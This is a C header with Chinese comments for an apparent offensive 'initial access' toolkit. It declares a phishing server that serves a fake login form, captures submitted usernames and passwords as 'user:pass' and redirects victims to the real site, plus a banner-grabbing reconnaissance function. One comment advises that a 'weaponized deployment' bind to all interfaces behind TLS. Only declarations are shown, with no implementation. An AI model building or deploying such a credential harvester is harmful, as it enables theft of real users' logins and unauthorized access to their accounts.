#ifndef INITIAL_ACCESS_H
#define INITIAL_ACCESS_H

#include <stddef.h>
#include <stdint.h>

/* 钓鱼：仅绑回环做本地验证；武器级部署改为 INADDR_ANY 并配 TLS 前置。
   port=0 由内核分配，用 phish_listen_port() 取实际端口。 */
int phish_listen(uint16_t port);
int phish_listen_port(int fd);

/* 服务一次连接：GET 返回登录表单，POST 捕获 user/pass 后 302 跳真实站点。
   creds 输出格式 "user:pass"。返回 0 成功，<0 失败。 */
int phish_serve_once(int lfd, const char *redirect_url,
                     char *creds, size_t creds_cap);

/* 横幅侦察：host_ip 必须是 IP 字面量（不调 getaddrinfo，规避静态链接故障）。
   连接后发 request，读回响应写入 out。返回 0 收到数据，<0 失败。 */
int recon_banner(const char *host_ip, uint16_t port,
                 const char *request, char *out, size_t out_cap);

#endif
